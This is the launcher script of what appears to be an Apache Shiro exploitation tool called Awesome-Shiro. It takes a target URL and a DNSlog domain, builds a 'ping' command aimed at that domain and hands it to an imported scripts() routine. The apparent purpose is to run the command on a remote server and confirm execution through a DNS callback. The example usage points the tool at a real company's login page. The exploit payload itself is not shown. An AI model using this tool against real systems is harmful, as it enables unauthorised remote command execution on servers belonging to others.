# -*- coding: utf-8 -*-
# svenbeast.com
import sys

from module.main import scripts

banner='''
          __     _____          __    
  _______/  |_  /  |  |   ____ |  | __
 /  ___/\   __\/   |  |__/ ___\|  |/ /
 \___ \  |  | /    ^   /\  \___|    < 
/____  > |__| \____   |  \___  >__|_ \\
     \/            |__|      \/     \/
'''
print('Welcome To Awesome-Shiro ! ')
print(banner)
if __name__ == '__main__':
    if len(sys.argv)!=3:
        print("Usage:"+"python3 shiro.py  url  dnslgURL")
        print("Example:"+"python3 shiro_crack.py http://www.baidu.com/login.do 1695jb.dnslog.cn")
    else:
        url = sys.argv[1]
        command = 'ping '+sys.argv[2]
        scripts(url, command)
    
